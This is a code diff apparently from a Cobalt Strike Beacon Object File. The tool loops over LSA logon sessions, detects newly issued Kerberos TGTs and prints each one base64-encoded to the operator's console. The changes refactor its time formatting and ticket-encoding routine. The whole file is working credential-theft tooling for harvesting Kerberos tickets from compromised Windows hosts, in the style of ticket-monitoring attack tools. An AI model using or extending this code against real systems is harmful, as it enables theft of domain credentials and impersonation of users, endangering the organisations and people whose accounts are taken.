@@ -77,9 +77,8 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
         return STATUS_MEMORY_NOT_ALLOCATED;
     }
     
+    // Get data for each logon session
     for (ULONG i = 0; i < sessionCount; i++) {
-
-        // Get actual data for logon session
         PSECURITY_LOGON_SESSION_DATA sessionData = NULL;
         status = SECUR32$LsaGetLogonSessionData(&sessionList[i], &sessionData);
         if (!NT_SUCCESS(status) || !sessionData)
@@ -139,10 +138,15 @@ NTSTATUS EnumerateTickets(HANDLE hLsa, ULONG authPackage, char* targetUser, PTIC
     return STATUS_SUCCESS;
 }
 
+/* 
+    Displaying Ticket Information
+*/
 VOID PrintTime(LARGE_INTEGER* li) {
+    LARGE_INTEGER localTime = { 0 };
     TIME_FIELDS tf = { 0 };
-    NTDLL$RtlTimeToTimeFields(li, &tf);
-    BeaconPrintf(CALLBACK_OUTPUT, "%d/%d/%d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
+    NTDLL$RtlSystemTimeToLocalTime(li, &localTime);
+    NTDLL$RtlTimeToTimeFields(&localTime, &tf);
+    BeaconPrintf(CALLBACK_OUTPUT, "%d-%d-%d %02d:%02d:%02d", tf.Day, tf.Month, tf.Year, tf.Hour, tf.Minute, tf.Second);
 }
 
 static const FLAG_ENTRY kerbFlags[] = {
@@ -168,8 +172,8 @@ static const FLAG_ENTRY kerbFlags[] = {
 VOID PrintTicketInformation(PTICKET_ENTRY entry) {
     // Header
     SYSTEMTIME now;
-    KERNEL32$GetSystemTime(&now);
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d/%d/%d %02d:%02d:%02d UTC - Found new TGT\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
+    KERNEL32$GetLocalTime(&now);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] %d-%d-%d %02d:%02d:%02d - Found new TGT:\n", now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute, now.wSecond);
     
     // Ticket information
     char user[512] = { 0 };
@@ -190,28 +194,32 @@ VOID PrintTicketInformation(PTICKET_ENTRY entry) {
             first = FALSE;
         }
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n  Encoded Ticket :  ");
 }
 
-static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-char* EncodeTicket(PBYTE data, ULONG size) {
-    ULONG outLen = ((size + 2) / 3) * 4 + 1;
-    char* out = MemAlloc(outLen);
-    if (!out) return NULL;
+VOID PrintTicket(PBYTE ticket, ULONG ticketSize) {
+    const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    ULONG b64Len = ((ticketSize + 2) / 3) * 4 + 1;
+    char* b64 = MemAlloc(b64Len); 
+    if (!b64) return;
 
     ULONG i = 0, j = 0;
-    while (i < size) {
-        ULONG rem  = size - i;
-        BYTE  b0   = data[i++];
-        BYTE  b1   = rem > 1 ? data[i++] : 0;
-        BYTE  b2   = rem > 2 ? data[i++] : 0;
-        out[j++] = b64chars[b0 >> 2];
-        out[j++] = b64chars[((b0 & 3) << 4) | (b1 >> 4)];
-        out[j++] = rem > 1 ? b64chars[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
-        out[j++] = rem > 2 ? b64chars[b2 & 0x3F] : '=';
+    while (i < ticketSize) {
+        ULONG rem  = ticketSize - i;
+        BYTE  b0   = ticket[i++];
+        BYTE  b1   = rem > 1 ? ticket[i++] : 0;
+        BYTE  b2   = rem > 2 ? ticket[i++] : 0;
+        b64[j++] = b64chars[b0 >> 2];
+        b64[j++] = b64chars[((b0 & 3) << 4) | (b1 >> 4)];
+        b64[j++] = rem > 1 ? b64chars[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
+        b64[j++] = rem > 2 ? b64chars[b2 & 0x3F] : '=';
     }
-    out[j] = '\0';
-    return out;
+    b64[j] = '\0';
+    
+    if(b64){
+        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", b64); 
+        MemFree(b64); 
+    }
 }
 
 VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CACHE curr) {
@@ -242,15 +250,13 @@ VOID RefreshCache(HANDLE hLsa, ULONG authPackage, PTICKET_CACHE prev, PTICKET_CA
                 .Length = (USHORT)(MSVCRT$wcslen(wspn) * 2),
                 .MaximumLength = (USHORT)(MSVCRT$wcslen(wspn) * 2 + 2)
             };
+            
             PrintTicketInformation(currEntry);
+            
             PBYTE ticket = NULL;
             ULONG ticketSize = 0;
             if (NT_SUCCESS(ExtractTicket(hLsa, authPackage, currEntry->luid, target, &ticket, &ticketSize)) && ticket && ticketSize) {
-                char* b64 = EncodeTicket(ticket, ticketSize);
-                if (b64) {
-                    BeaconPrintf(CALLBACK_OUTPUT, "\n%s\n", b64);
-                    MemFree(b64);
-                }
+                PrintTicket(ticket, ticketSize);
                 MemFree(ticket);
             }
             cacheUpdated = TRUE;
@@ -296,6 +302,8 @@ VOID go(char* args, int argc) {
     TICKET_CACHE curr = { 0 };
     
     do {
+
+        // Periodically check for new TGTs
         if (NT_SUCCESS(EnumerateTickets(hLsa, authPackage, targetUser, &curr))) {
             RefreshCache(hLsa, authPackage, &prev, &curr);
             if (prev.tickets)
